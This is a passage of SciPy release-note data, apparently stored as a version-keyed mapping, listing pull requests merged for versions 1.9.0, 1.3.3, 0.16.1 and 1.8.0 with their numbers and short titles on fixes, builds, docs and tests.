<https://github.com/scipy/scipy/pull/16530>`__: MAINT: fix umfpack test failure with numpy 1.23\n* `16539 <https://github.com/scipy/scipy/pull/16539>`__: MAINT: more 1.9.0rc2 backports\n* `16541 <https://github.com/scipy/scipy/pull/16541>`__: BLD: fix regression in building _lsap with symbol visibility\n* `16549 <https://github.com/scipy/scipy/pull/16549>`__: BLD: fix an outdated requirement for macOS arm64 in pyproject.toml\n* `16551 <https://github.com/scipy/scipy/pull/16551>`__: BLD: fix \\`__STDC_VERSION__\\` check in \\`special/_round.h\\`\n* `16553 <https://github.com/scipy/scipy/pull/16553>`__: BLD: raise an error with clear message for too-new Python version\n* `16556 <https://github.com/scipy/scipy/pull/16556>`__: DOC: small tweaks to 1.9.0 release notes\n* `16563 <https://github.com/scipy/scipy/pull/16563>`__: DOC: Reflect MSVC minimum toolchain requirement\n* `16570 <https://github.com/scipy/scipy/pull/16570>`__: MAINT: backports before 1.9.0rc3\n* `16572 <https://github.com/scipy/scipy/pull/16572>`__: MAINT: update bundled licenses for removal of scipy-sphinx-theme\n* `16581 <https://github.com/scipy/scipy/pull/16581>`__: MAINT: stats: fix skew/kurtosis empty 1d input\n* `16586 <https://github.com/scipy/scipy/pull/16586>`__: MAINT: stats.truncnorm: improve CDF accuracy/speed\n* `16593 <https://github.com/scipy/scipy/pull/16593>`__: TST: stats: replace TestTruncnorm::test_moments\n* `16599 <https://github.com/scipy/scipy/pull/16599>`__: MAINT: stats.truncnorm.rvs: improve performance\n* `16605 <https://github.com/scipy/scipy/pull/16605>`__: MAINT: stats.truncnorm: simplify remaining methods\n* `16622 <https://github.com/scipy/scipy/pull/16622>`__: ENH: FIX: update HiGHS submodule to resolve MIP infeasibility...\n* `16638 <https://github.com/scipy/scipy/pull/16638>`__: DOC: update docs on building with Meson\n* `16664 <https://github.com/scipy/scipy/pull/16664>`__: MAINT: stats._axis_nan_policy: preserve dtype of masked arrays...\n* `16671 <https://github.com/scipy/scipy/pull/16671>`__: BLD: update \\`meson\\` and \\`meson-python\\` versions for 1.9.0...\n* `16684 <https://github.com/scipy/scipy/pull/16684>`__: MAINT: optimize.linprog: ensure integrality can be an array\n* `16688 <https://github.com/scipy/scipy/pull/16688>`__: DOC: a few mailmap updates\n* `16719 <https://github.com/scipy/scipy/pull/16719>`__: MAINT: stats: Work around Cython bug.\n* `16721 <https://github.com/scipy/scipy/pull/16721>`__: MAINT: stats.monte_carlo_test: used biased estimate of p-value\n\n\n==========================\n", "1.3.3": "-----------------------\n\n* `11034 <https://github.com/scipy/scipy/pull/11034>`__: MAINT: TST: Skip tests with multiprocessing that use \"spawn\" start method\n\n\n==========================\n", "0.16.1": "------------------------\n\n- `5088 <https://github.com/scipy/scipy/pull/5088>`__: BUG: fix logic error in cKDTree.sparse_distance_matrix\n- `5089 <https://github.com/scipy/scipy/pull/5089>`__: BUG: Don't overwrite b in lfilter's FIR path\n- `5128 <https://github.com/scipy/scipy/pull/5128>`__: BUG: solve_banded failed when solving 1x1 systems\n- `5155 <https://github.com/scipy/scipy/pull/5155>`__: BLD: fix missing Python include for Homebrew builds.\n- `5192 <https://github.com/scipy/scipy/pull/5192>`__: BUG: backport as_inexact kwarg to _asarray_validated\n- `5203 <https://github.com/scipy/scipy/pull/5203>`__: BUG: fix uninitialized use in lartg 0.16 backport\n- `5204 <https://github.com/scipy/scipy/pull/5204>`__: BUG: properly return error to fortran from ode_jacobian_function...\n- `5207 <https://github.com/scipy/scipy/pull/5207>`__: TST: Fix TestCtypesQuad failure on Python 3.5 for Windows\n- `5352 <https://github.com/scipy/scipy/pull/5352>`__: TST: sparse: silence warnings about boolean indexing\n- `5355 <https://github.com/scipy/scipy/pull/5355>`__: MAINT: backports for 0.16.1 release\n- `5356 <https://github.com/scipy/scipy/pull/5356>`__: REL: update Paver file to ensure sdist contents are OK for releases.\n- `5382 <https://github.com/scipy/scipy/pull/5382>`__: 0.16.x backport: MAINT: work around a possible numpy ufunc loop...\n- `5393 <https://github.com/scipy/scipy/pull/5393>`__: TST:special: bump tolerance levels for test_j_roots and test_js_roots\n- `5417 <https://github.com/scipy/scipy/pull/5417>`__: MAINT: stats: move namedtuple creating outside function calls.\n\n\n=========================\n", "1.8.0": "***********************\n\n* `4607 <https://github.com/scipy/scipy/pull/4607>`__: Add Chirp Z-transform, zoom FFT\n* `10504 <https://github.com/scipy/scipy/pull/10504>`__: ENH: Carlson symmetric elliptic integrals.\n* `11263 <https://github.com/scipy/scipy/pull/11263>`__: MAINT:optimize: Comply with user-specified rel_step\n* `11754 <https://github.com/scipy/scipy/pull/11754>`__: ENH: stats: Updates to \\`variation\\`.\n* `11954 <https://github.com/scipy/scipy/pull/11954>`__: ENH: improve ARGUS rv generation in scipy.stats\n* `12143 <https://github.com/scipy/scipy/pull/12143>`__: BUG: Correctly use \\`axis\\` in \\`scipy.stats.tmean\\`\n* `12146 <https://github.com/scipy/scipy/pull/12146>`__: DOC: add docs to explain behaviour of newton's mehod on arrays\n* `12197 <https://github.com/scipy/scipy/pull/12197>`__: BUG: fix moments method to support arrays and list\n* `12889 <https://github.com/scipy/scipy/pull/12889>`__: MAINT: deal with cases in \\`minimize\\` for \\`(bounds.lb == bounds.ub).any()\n* `13002 <https://github.com/scipy/scipy/pull/13002>`__: ENH: stats: Tukey's honestly significant difference test\n* `13096 <https://github.com/scipy/scipy/pull/13096>`__: BUG: optimize: alternative fix for minimize issues with lb==ub\n* `13143 <https://github.com/scipy/scipy/pull/13143>`__: MAINT: deal with cases in \\`minimize\\` for \\`(bounds.lb == bounds.ub).any()...\n* `13229 <https://github.com/scipy/scipy/pull/13229>`__: ENH: modernise some Fortran code, needed for nagfor compiler\n* `13312 <https://github.com/scipy/scipy/pull/13312>`__: ENH: stats: add \\`axis\\` and \\`nan_policy\\` parameters to functions...\n* `13347 <https://github.com/scipy/scipy/pull/13347>`__: CI: bump gcc from 4.8 to 5.x\n* `13392 <https://github.com/scipy/scipy/pull/13392>`__: MAINT: streamlined kwargs for minimizer in dual_annealing\n* `13419 <https://github.com/scipy/scipy/pull/13419>`__: BUG: Fix group delay singularity check\n* `13471 <https://github.com/scipy/scipy/pull/13471>`__: ENH: LHS based OptimalDesign (scipy.stats.qmc)\n* `13581 <https://github.com/scipy/scipy/pull/13581>`__: MAINT: stats: fix truncnorm stats with array shapes\n* `13839 <https://github.com/scipy/scipy/pull/13839>`__: MAINT: set same tolerance between LSMR and LSQR\n* `13864 <https://github.com/scipy/scipy/pull/13864>`__: Array scalar conversion deprecation\n* `13883 <https://github.com/scipy/scipy/pull/13883>`__: MAINT: move LSAP maximization handling into solver code\n* `13899 <https://github.com/scipy/scipy/pull/13899>`__: ENH: stats: add general permutation hypothesis test\n* `13921 <https://github.com/scipy/scipy/pull/13921>`__: BUG: optimize: fix max function call validation for \\`minimize\\`...\n* `13958 <https://github.com/scipy/scipy/pull/13958>`__: ENH: stats: add \\`alternative\\` to masked version of T-Tests\n* `13960 <https://github.com/scipy/scipy/pull/13960>`__: ENH: stats: add \\`alternative\\` to masked normality tests\n* `14007 <https://github.com/scipy/scipy/pull/14007>`__: BUG: Fix root bracketing logic in Brent's method (issue #13737)\n* `14024 <https://github.com/scipy/scipy/pull/14024>`__: ENH: Add annotations for \\`scipy.spatial.cKDTree\\`\n* `14049 <https://github.com/scipy/scipy/pull/14049>`__: MAINT: Change special.orthogonal.orthopoly1d type hints to ArrayLike\n* `14132 <https://github.com/scipy/scipy/pull/14132>`__: DOC: badge with version of the doc in the navbar\n* `14144 <https://github.com/scipy/scipy/pull/14144>`__: REL: set version to 1.8.0.dev0\n* `14151 <https://github.com/scipy/scipy/pull/14151>`__: BLD: update pyproject.toml - add macOS M1, drop py36\n* `14153 <https://github.com/scipy/scipy/pull/14153>`__: BUG: stats: Implementing boost's hypergeometric distribution...\n* `14160 <https://github.com/scipy/scipy/pull/14160>`__: ENH: sparse.linalg: Add TFQMR algorithm for non-Hermitian sparse...\n* `14163 <https://github.com/scipy/scipy/pull/14163>`__: BENCH: add benchmark for energy_distance and wasserstein_distance\n* `14173 <https://github.com/scipy/scipy/pull/14173>`__: BUG: Fixed an issue wherein \\`geometric_slerp\\` would return...\n* `14174 <https://github.com/scipy/scipy/pull/14174>`__: ENH: Add annotations to \\`scipy.spatial.geometric_slerp\\`\n* `14183 <https://github.com/scipy/scipy/pull/14183>`__: DOC: add examples/ update mstats doc of pearsonr in scipy.stats\n* `14186 <https://github.com/scipy/scipy/pull/14186>`__: TST, MAINT: hausdorff test cleanups\n* `14187 <https://github.com/scipy/scipy/pull/14187>`__: DOC: interpolate: rbf has kwargs too.\n* `14191 <https://github.com/scipy/scipy/pull/14191>`__: MAINT:TST:linalg modernize the test assertions\n* `14192 <https://github.com/scipy/scipy/pull/14192>`__: BUG: stats: fix shape handing in multivariate_t.rvs\n* `14197 <https://github.com/scipy/scipy/pull/14197>`__: CI: azure: Fix handling of 'skip azp'.\n* `14200 <https://github.com/scipy/scipy/pull/14200>`__: DOC: Remove link to alpha in scipy.stats.dirichlet\n* `14201 <https://github.com/scipy/scipy/pull/14201>`__: TST: cleanup in lsqr and lsmr tests\n* `14204 <https://github.com/scipy/scipy/pull/14204>`__: Improve error message for index dimension\n* `14208 <https://github.com/scipy/scipy/pull/14208>`__: MAINT: add invalid='ignore' to np.errstate block in PchipInterpolator\n* `14209 <https://github.com/scipy/scipy/pull/14209>`__: ENH: stats: kendalltau: add alternative parameter\n* `14210 <https://github.com/scipy/scipy/pull/14210>`__: BUG: Fix Nelder-Mead logic when using a non-1D x0 and adapative\n* `14211 <https://github.com/scipy/scipy/pull/14211>`__: Fixed doc for gaussian_kde (kde.factor description)\n* `14213 <https://github.com/scipy/scipy/pull/14213>`__: ENH: stats: somersd: add alternative parameter\n* `14214 <https://github.com/scipy/scipy/pull/14214>`__: ENH: Improve the \\`scipy.spatial.qhull\\` annotations\n* `14215 <https://github.com/scipy/scipy/pull/14215>`__: ENH: stats: Integrate library UNU.RAN in \\`scipy.stats\\` [GSoC...\n* `14218 <https://github.com/scipy/scipy/pull/14218>`__: DOC: clarify \\`ndimage.center_of_mass\\` docstring\n* `14219 <https://github.com/scipy/scipy/pull/14219>`__: ENH: sparse.linalg: Use the faster \"sqrt\" from \"math\" and be...\n* `14222 <https://github.com/scipy/scipy/pull/14222>`__: MAINT: stats: remove unused 'type: ignore' comment\n* `14224 <https://github.com/scipy/scipy/pull/14224>`__: MAINT: Modify to use new random API in benchmarks\n* `14225 <https://github.com/scipy/scipy/pull/14225>`__: MAINT: fix missing LowLevelCallable in \\`dir(scipy)\\`\n* `14226 <https://github.com/scipy/scipy/pull/14226>`__: BLD: fix warning for missing dependency, and dev version number\n* `14227 <https://github.com/scipy/scipy/pull/14227>`__: MAINT: fix maybe-uninitialized warnings in lbfgbf.f\n* `14228 <https://github.com/scipy/scipy/pull/14228>`__: BENCH: add more benchmarks for inferential statistics tests\n* `14237 <https://github.com/scipy/scipy/pull/14237>`__: Removes unused variable\n* `14240 <https://github.com/scipy/scipy/pull/14240>`__: ENH: sparse.linalg: Normalize type descriptions\n* `14242 <https://github.com/scipy/scipy/pull/14242>`__: BUG: stats: fix discrete \\`.isf\\` to work at boundaries when...\n* `14250 <https://github.com/scipy/scipy/pull/14250>`__: Error in parameter checking in cdfbin.f\n* `14254 <https://github.com/scipy/scipy/pull/14254>`__: BUG: Fixed an issue wherein \\`SphericalVoronoi\\` could raise...\n* `14255 <https://github.com/scipy/scipy/pull/14255>`__: BUG: Numerical stability for large N BarycentricInterpolator\n* `14257 <https://github.com/scipy/scipy/pull/14257>`__: MAINT: Fixed deprecated API calls in scipy.optimize\n* `14258 <https://github.com/scipy/scipy/pull/14258>`__: DOC: fix stats.pearsonr example that was failing in CI\n* `14259 <https://github.com/scipy/scipy/pull/14259>`__: CI: pin mypy to 0.902 and fix one CI failure\n* `14260 <https://github.com/scipy/scipy/pull/14260>`__: BLD: optimize: fix some warnings in moduleTNC and minpack.h\n* `14261 <https://github.com/scipy/scipy/pull/14261>`__: BLD: fix include order and build warnings for \\`optimize/_trlib\\`\n* `14263 <https://github.com/scipy/scipy/pull/14263>`__: DOC: forward port 1.7.0 relnotes\n* `14268 <https://github.com/scipy/scipy/pull/14268>`__: MAINT: Replaced direct field access in PyArrayObject\\* with wrapper...\n* `14274 <https://github.com/scipy/scipy/pull/14274>`__: MAINT: more scalar array conversion fixes for optimize\n* `14275 <https://github.com/scipy/scipy/pull/14275>`__: MAINT: Update vendored uarray, required for auto-dispatching\n* `14278 <https://github.com/scipy/scipy/pull/14278>`__: MAINT: two small fixes for implicit scalar-array-conversions\n* `14281 <https://github.com/scipy/scipy/pull/14281>`__: ENH: Annotate the array dtypes of \\`scipy.spatial.qhull\\`\n* `14285 <https://github.com/scipy/scipy/pull/14285>`__: DEV: remove scikit-umfpack from environment.yml\n* `14287 <https://github.com/scipy/scipy/pull/14287>`__: TST: Add testing for hyp2f1 for complex values in anticipation...\n* `14291 <https://github.com/scipy/scipy/pull/14291>`__: TST: split combined LSAP input validation tests up\n* `14293 <https://github.com/scipy/scipy/pull/14293>`__: MAINT: remove the last deprecated \\`PyEval_\\*\\` usages\n* `14294 <https://github.com/scipy/scipy/pull/14294>`__: ENH: Annotate array dtypes in \\`scipy.spatial.ckdtree\\` and \\`distance\\`\n* `14295 <https://github.com/scipy/scipy/pull/14295>`__: MAINT: move LSAP input validation into lsap_module\n* `14297 <https://github.com/scipy/scipy/pull/14297>`__: DOC: Make code block an Item List\n* `14301 <https://github.com/scipy/scipy/pull/14301>`__: MAINT: fix the last build warning in \\`optimize/_trlib/\\`\n* `14302 <https://github.com/scipy/scipy/pull/14302>`__: BLD: fix build warnings for \\`stats/biasedurn\\`\n* `14305 <https://github.com/scipy/scipy/pull/14305>`__: MAINT: silence warning in odepackmodule.c\n* `14308 <https://github.com/scipy/scipy/pull/14308>`__: ENH: use Pythran to speedup somersd and _tau_b\n* `14309 <https://github.com/scipy/scipy/pull/14309>`__: BLD: fix build warnings for scipy.special\n* `14310 <https://github.com/scipy/scipy/pull/14310>`__: ENH: make epsilon optional in optimize.approx_fprime.\n* `14311 <https://github.com/scipy/scipy/pull/14311>`__: MAINT: Corrected NumPy API usage in scipy.spatial\n* `14312 <https://github.com/scipy/scipy/pull/14312>`__: ENH: Using random directional derivative to check grad\n* `14326 <https://github.com/scipy/scipy/pull/14326>`__: MAINT: Removed redifinition of trace1 in spatial/qhull\n* `14328 <https://github.com/scipy/scipy/pull/14328>`__: MAINT: _lib: add __dealloc__ to MessageStream\n* `14331 <https://github.com/scipy/scipy/pull/14331>`__: ENH: Complement \\`trace\\` method of sparse matrices like \\`csr_matrix/csc_matrix/coo_matrix\\`\n* `14338 <https://github.com/scipy/scipy/pull/14338>`__: BUG: fix \\`stats.binned_statistic_dd\\` issue with values close...\n* `14339 <https://github.com/scipy/scipy/pull/14339>`__: TST: fix \\`sparse.linalg.spsolve\\` test with singular input\n* `14341 <https://github.com/scipy/scipy/pull/14341>`__: MAINT: Add missing parenthesis in _nnls.py\n* `14342 <https://github.com/scipy/scipy/pull/14342>`__: ENH: make \\`savgol_coeffs\\`, \\`savgol_filter\\` work for even...\n* `14344 <https://github.com/scipy/scipy/pull/14344>`__: ENH: scipy.interpolate b-splines (design_matrix)\n* `14350 <https://github.com/scipy/scipy/pull/14350>`__: MAINT: make fit method of rv_continuous pickleable\n* `14358 <https://github.com/scipy/scipy/pull/14358>`__: ENH: Dinic's algorithm for maximum_flow\n* `14359 <https://github.com/scipy/scipy/pull/14359>`__: ENH: Set fft backend with try_last=True\n* `14362 <https://github.com/scipy/scipy/pull/14362>`__: Use list comprehension\n* `14367 <https://github.com/scipy/scipy/pull/14367>`__: BUG: Check for NULL pointer in \\`memmove\\`\n* `14377 <https://github.com/scipy/scipy/pull/14377>`__: Fix behavior of binary morphology with output=input when iterations=1\n* `14378 <https://github.com/scipy/scipy/pull/14378>`__: MAINT: Removing deprecated NumPy C API from \\`interpolate\\`\n* `14380 <https://github.com/scipy/scipy/pull/14380>`__: ENH: Fixed intercept computation in theilslopes\n* `14381 <https://github.com/scipy/scipy/pull/14381>`__: BENCH: add benchmark for somersd\n* `14387 <https://github.com/scipy/scipy/pull/14387>`__: MAINT: Removed deprecated NumPy C api from \\`sparse\\`\n* `14392 <https://github.com/scipy/scipy/pull/14392>`__: BUG/ENH: rework maximum flow preprocessing\n* `14393 <https://github.com/scipy/scipy/pull/14393>`__: CI: Lint checks failures are reporting success\n* `14403 <https://github.com/scipy/scipy/pull/14403>`__: Fix off by one error in doc string.\n* `14404 <https://github.com/scipy/scipy/pull/14404>`__: DOC: docstring fix for default of n param of interpolate.pade\n* `14406 <https://github.com/scipy/scipy/pull/14406>`__: MAINT: Use numpy_nodepr_api in \\`spatial\\`\n* `14411 <https://github.com/scipy/scipy/pull/14411>`__: MAINT: minor cleanups in usage of \\`compute_uv\\` keyword of \\`svd\\`\n* `14413 <https://github.com/scipy/scipy/pull/14413>`__: DOC:interpolate: Fix the docstring example of \"lagrange\"\n* `14419 <https://github.com/scipy/scipy/pull/14419>`__: DEP: deprecate private but non-underscored \\`signal.spline\\`...\n* `14422 <https://github.com/scipy/scipy/pull/14422>`__: MAINT: csgraph: change Dinic algorithm to iterative implementation\n* `14423 <https://github.com/scipy/scipy/pull/14423>`__: CI: remove printing of skipped and xfailed tests from Azure test...\n* `14426 <https://github.com/scipy/scipy/pull/14426>`__: ENH: Add args argument for callable in quad_vec\n* `14427 <https://github.com/scipy/scipy/pull/14427>`__: MAINT: extra pythran annotation for i686 support\n* `14432 <https://github.com/scipy/scipy/pull/14432>`__: BUG/ENH: more stable recursion for 2-sample ks test exact p-values\n* `14433 <https://github.com/scipy/scipy/pull/14433>`__: ENH: add PROPACK wrapper for improved sparse SVD\n* `14440 <https://github.com/scipy/scipy/pull/14440>`__: MAINT: stats: silence mypy complaints\n* `14441 <https://github.com/scipy/scipy/pull/14441>`__: ENH: TST: add a threadpoolctl hook to limit OpenBLAS parallelism\n* `14442 <https://github.com/scipy/scipy/pull/14442>`__: MAINT: Fix uninitialized warnings in \\`sparse/linalg/dsolve\\`\n* `14447 <https://github.com/scipy/scipy/pull/14447>`__: MAINT: rename scipy.ndimage modules\n* `14449 <https://github.com/scipy/scipy/pull/14449>`__: ENH: Cythonize van der corput\n* `14454 <https://github.com/scipy/scipy/pull/14454>`__: MAINT: Begin translation of hyp2f1 for complex numbers into Cython\n* `14456 <https://github.com/scipy/scipy/pull/14456>`__: CI: Lint with flake8 instead of pyflakes + pycodestyle\n* `14458 <https://github.com/scipy/scipy/pull/14458>`__: DOC: clarify meaning of rvalue in stats.linregress\n* `14459 <https://github.com/scipy/scipy/pull/14459>`__: MAINT: Fix uninitialized warnings in \\`interpolate\\` and \\`cluster\\`\n* `14463 <https://github.com/scipy/scipy/pull/14463>`__: Fix typo in doc overview: \"pandas\" to \"SciPy\"\n* `14474 <https://github.com/scipy/scipy/pull/14474>`__: DEP: Deprecate private but non-underscored ndimage.<module> namespace\n* `14477 <https://github.com/scipy/scipy/pull/14477>`__: MAINT: Using Tempita file for bspline (signal)\n* `14479 <https://github.com/scipy/scipy/pull/14479>`__: Added \\`Inverse\\` word in \\`idstn\\` and \\`idctn\\` docstrings\n* `14487 <https://github.com/scipy/scipy/pull/14487>`__: TST: modify flaky test for constrained minimization\n* `14489 <https://github.com/scipy/scipy/pull/14489>`__: MAINT: cleanup of some line_search code\n* `14492 <https://github.com/scipy/scipy/pull/14492>`__: CI: make sure Azure job step fails when building a SciPy wheel...\n* `14496 <https://github.com/scipy/scipy/pull/14496>`__: MAINT: switch to using spmatrix.toarray instead of .todense\n* `14499 <https://github.com/scipy/scipy/pull/14499>`__: DOC: fix toarray/todense docstring\n* `14507 <https://github.com/scipy/scipy/pull/14507>`__: CI: Add lint_diff docs & option to run only on specified files/dirs\n* `14513 <https://github.com/scipy/scipy/pull/14513>`__: DOC: added reference and example in jacobi docstring\n* `14520 <https://github.com/scipy/scipy/pull/14520>`__: BUG: diffev maxfun can be reached partway through population\n* `14524 <https://github.com/scipy/scipy/pull/14524>`__: ENH: Rotation.concatenate\n* `14532 <https://github.com/scipy/scipy/pull/14532>`__: ENH: sparse.linalg: The solution is zero when R.H.S. is zero\n* `14538 <https://github.com/scipy/scipy/pull/14538>`__: CI: Revert \"CI: make sure Azure job step fails when building...\n* `14539 <https://github.com/scipy/scipy/pull/14539>`__: DOC: added chebyt and chebyu docstring examples in scipy.special\n* `14546 <https://github.com/scipy/scipy/pull/14546>`__: ENH: Orthogonal Latin Hypercube Sampling to QMC\n* `14547 <https://github.com/scipy/scipy/pull/14547>`__: ENH: __setitem__ method for Rotation class\n* `14549 <https://github.com/scipy/scipy/pull/14549>`__: Small test fixes for pypy + win + mmap\n* `14554 <https://github.com/scipy/scipy/pull/14554>`__: ENH: scipy.interpolate.BSpline from_power_basis\n* `14555 <https://github.com/scipy/scipy/pull/14555>`__: BUG: sparse: fix a DIA.tocsc bug\n* `14556 <https://github.com/scipy/scipy/pull/14556>`__: Fix the link to details of the strongly connected components...\n* `14559 <https://github.com/scipy/scipy/pull/14559>`__: WIP: TST: add tests for Pythran somersd\n* `14561 <https://github.com/scipy/scipy/pull/14561>`__: DOC: added reference and examples in (gen)laguerre docstring...\n* `14564 <https://github.com/scipy/scipy/pull/14564>`__: ENH: Add threaded Van Der Corput\n* `14571 <https://github.com/scipy/scipy/pull/14571>`__: Fix repeated word in _mannwhitneyu.py example\n* `14572 <https://github.com/scipy/scipy/pull/14572>`__: Set min length of the knot array for BSpline.design_matrix\n* `14578 <https://github.com/scipy/scipy/pull/14578>`__: DOC: added examples in spherical Bessel docstrings\n* `14581 <https://github.com/scipy/scipy/pull/14581>`__: MAINT: Refactor \\`linalg.tests.test_interpolative::TestInterpolativeDecomposition::test_id\\`\n* `14588 <https://github.com/scipy/scipy/pull/14588>`__: ENH: Added \\`\\`kulczynski1\\`\\` to \\`\\`scipy.spatial.distance\\`\\`\n* `14592 <https://github.com/scipy/scipy/pull/14592>`__: DOC: clarify parameters of norminvgauss in scipy.stats\n* `14595 <https://github.com/scipy/scipy/pull/14595>`__: Removing unused subroutines in \\`\\`scipy/linalg/src/id_dist/src/prini.f\\`\\`\n* `14601 <https://github.com/scipy/scipy/pull/14601>`__: Fixed inconsistencies between numpy and scipy interp\n* `14602 <https://github.com/scipy/scipy/pull/14602>`__: MAINT: Fix \\`-Wunused-result\\` warnings in \\`sparse/linalg/dsolve\\`\n* `14603 <https://github.com/scipy/scipy/pull/14603>`__: DEV: initialize all submodules in Gitpod Dockerfile\n* `14609 <https://github.com/scipy/scipy/pull/14609>`__: MAINT: Fix \\`-Wmaybe-uninitialized\\` warnings in \\`optimize/_highs\\`\n* `14610 <https://github.com/scipy/scipy/pull/14610>`__: MAINT: Ignored \\`\\`scipy/signal/bspline_util.c\\`\\`\n* `14613 <https://github.com/scipy/scipy/pull/14613>`__: MAINT: interpolate: Declare type for a Cython indexing variable.\n* `14619 <https://github.com/scipy/scipy/pull/14619>`__: ENH: stats.unuran: add Polynomial interpolation based numerical...\n* `14620 <https://github.com/scipy/scipy/pull/14620>`__: CI: fix Azure job which uses pre-release wheels + Python 3.7\n* `14625 <https://github.com/scipy/scipy/pull/14625>`__: ENH: optimize min max and median scipy.stats.binned_statistic\n* `14626 <https://github.com/scipy/scipy/pull/14626>`__: MAINT: fix type-narrowing addition in sparse.construct.bmat\n* `14627 <https://github.com/scipy/scipy/pull/14627>`__: MAINT: Bumped tolerances to pass \\`\\`special.tests\\`\\` on Apple...\n* `14628 <https://github.com/scipy/scipy/pull/14628>`__: DOC: clarify usage of options param in scipy.optimize.linprog\n* `14629 <https://github.com/scipy/scipy/pull/14629>`__: ENH: optimize std in scipy.stats.binned_statistic\n* `14630 <https://github.com/scipy/scipy/pull/14630>`__: DOC: add citation file\n* `14631 <https://github.com/scipy/scipy/pull/14631>`__: Fix unuran builds for older compilers\n* `14633 <https://github.com/scipy/scipy/pull/14633>`__: BUG: scipy.stats._unran: send only strings to include_dirs\n* `14634 <https://github.com/scipy/scipy/pull/14634>`__: DOC: Fix Wikipedia bootstrap link\n* `14635 <https://github.com/scipy/scipy/pull/14635>`__: DOC: stats: fix multivariate_t docs pdf eqn\n* `14637 <https://github.com/scipy/scipy/pull/14637>`__: MAINT: copy discrete dist dict\n* `14643 <https://github.com/scipy/scipy/pull/14643>`__: MAINT: address gh6019, disp for minimize_scalar\n* `14644 <https://github.com/scipy/scipy/pull/14644>`__: DOC: stats: add UNU.RAN references in the tutorial\n* `14649 <https://github.com/scipy/scipy/pull/14649>`__: DOC: clarify SciPy compatibility with Python and NumPy.\n* `14655 <https://github.com/scipy/scipy/pull/14655>`__: MAINT: remove support for Python 3.7 (hence NumPy 1.16)\n* `14656 <https://github.com/scipy/scipy/pull/14656>`__: MAINT: replacing ``assert_`` with assert\n* `14658 <https://github.com/scipy/scipy/pull/14658>`__: DOC: use conda-forge in Ubuntu quickstart\n* `14660 <https://github.com/scipy/scipy/pull/14660>`__: MAINT: refactor \"for ... in range(len(\" statements\n* `14663 <https://github.com/scipy/scipy/pull/14663>`__: MAINT: update leftover Python and NumPy version from pyproject.toml\n* `14665 <https://github.com/scipy/scipy/pull/14665>`__: BLD: fix confusing \"import pip\" failure that should be caught\n* `14666 <https://github.com/scipy/scipy/pull/14666>`__: MAINT: remove unnecessary seeding and update \\`check_random_state\\`\n* `14669 <https://github.com/scipy/scipy/pull/14669>`__: ENH: Refactor GitHub Issue form templates\n* `14673 <https://github.com/scipy/scipy/pull/14673>`__: BLD: fix include order, Python.h before standard headers\n* `14676 <https://github.com/scipy/scipy/pull/14676>`__: BUG: Fixes failing benchmark tests optimize_qap.QuadraticAssignment.track_score\n* `14677 <https://github.com/scipy/scipy/pull/14677>`__: MAINT: github labeler on file paths\n* `14682 <https://github.com/scipy/scipy/pull/14682>`__: DOC: Fix typo in mannwhitneyu docstring\n* `14684 <https://github.com/scipy/scipy/pull/14684>`__: DOC: optimize: fix sporadic linprog doctest failure\n* `14685 <https://github.com/scipy/scipy/pull/14685>`__: MAINT: static typing of entropy\n* `14686 <https://github.com/scipy/scipy/pull/14686>`__: BUG: fix issue in lsqr.py introduced in a recent commit\n* `14689 <https://github.com/scipy/scipy/pull/14689>`__: MAINT: replace IOError alias with OSError or other appropriate...\n* `14692 <https://github.com/scipy/scipy/pull/14692>`__: MAINT: Translation of hyp2f1 for complex numbers into Cython,...\n* `14693 <https://github.com/scipy/scipy/pull/14693>`__: DOC: update OptimizeResult notes\n* `14694 <https://github.com/scipy/scipy/pull/14694>`__: Simplify PythranBuildExt usage\n* `14695 <https://github.com/scipy/scipy/pull/14695>`__: BLD: bump Pythran version to 0.9.12\n* `14697 <https://github.com/scipy/scipy/pull/14697>`__: CI: add \\`cffi\\` in the benchmark CI job, and in environment.yml\n* `14699 <https://github.com/scipy/scipy/pull/14699>`__: BUG: Fix TypeError in \\`stats._discrete_distns\\`\n* `14700 <https://github.com/scipy/scipy/pull/14700>`__: DOC: update detailed roadmap\n* `14701 <https://github.com/scipy/scipy/pull/14701>`__: ENH:linalg: Add Cythonized get_array_bandwidth, issymmetric,...\n* `14706 <https://github.com/scipy/scipy/pull/14706>`__: BUG: Fix hyp2f1 to return correct values in regions near exp(\u00b1i\u03c0/3).\n* `14707 <https://github.com/scipy/scipy/pull/14707>`__: Update constants.py\n* `14708 <https://github.com/scipy/scipy/pull/14708>`__: BENCH: shorten svds benchmark that is timing out in CI\n* `14709 <https://github.com/scipy/scipy/pull/14709>`__: CI: remove labeler sync\n* `14712 <https://github.com/scipy/scipy/pull/14712>`__: MAINT: special: Updates for _cosine.c.\n* `14720 <https://github.com/scipy/scipy/pull/14720>`__: DOC: optimize hess and consistency\n* `14721 <https://github.com/scipy/scipy/pull/14721>`__: MAINT: correct PR template link\n* `14723 <https://github.com/scipy/scipy/pull/14723>`__: DOC: add note on padding to \\`stats.binned_statistic_2d\\` docs\n* `14727 <https://github.com/scipy/scipy/pull/14727>`__: ENH: sparse.linalg: Add an useful nonzero initial guess option\n* `14729 <https://github.com/scipy/scipy/pull/14729>`__: DOC: fix documentation for scipy.optimize.brenth\n* `14737 <https://github.com/scipy/scipy/pull/14737>`__: BUG:signal: matching window dtype to input\n* `14739 <https://github.com/scipy/scipy/pull/14739>`__: TST: sparse.linalg: Add test case with 2-D Poisson equations\n* `14743 <https://github.com/scipy/scipy/pull/14743>`__: TST:sparse.linalg: Use the more convenient \"assert_normclose\"...\n* `14748 <https://github.com/scipy/scipy/pull/14748>`__: DOC: fix matrix representation in scipy.sparse.csgraph\n* `14751 <https://github.com/scipy/scipy/pull/14751>`__: ENH: numpy masked_arrays in refguide-check\n* `14755 <https://github.com/scipy/scipy/pull/14755>`__: BUG: Avoid \\`solve_ivp\\` failure when \\`ts\\` is empty\n* `14756 <https://github.com/scipy/scipy/pull/14756>`__: MAINT: LinAlgError from public numpy.linalg\n* `14759 <https://github.com/scipy/scipy/pull/14759>`__: BLD: change section name in site.cfg.example from ALL to DEFAULT\n* `14760 <https://github.com/scipy/scipy/pull/14760>`__: TST: suppress jinja2 deprecation warning\n* `14761 <https://github.com/scipy/scipy/pull/14761>`__: CI: remove \\`pre_release_deps_source_dist\\` job from Azure CI...\n* `14762 <https://github.com/scipy/scipy/pull/14762>`__: TST: add a seed to the pickling test of RBFInterpolator\n* `14763 <https://github.com/scipy/scipy/pull/14763>`__: MAINT: Make solve_ivp slightly more strict wrt. t_span.\n* `14772 <https://github.com/scipy/scipy/pull/14772>`__: DOC:special: Fix broken links to jburkardt\n* `14787 <https://github.com/scipy/scipy/pull/14787>`__: MAINT: Increase tolerance values to avoid test failures\n* 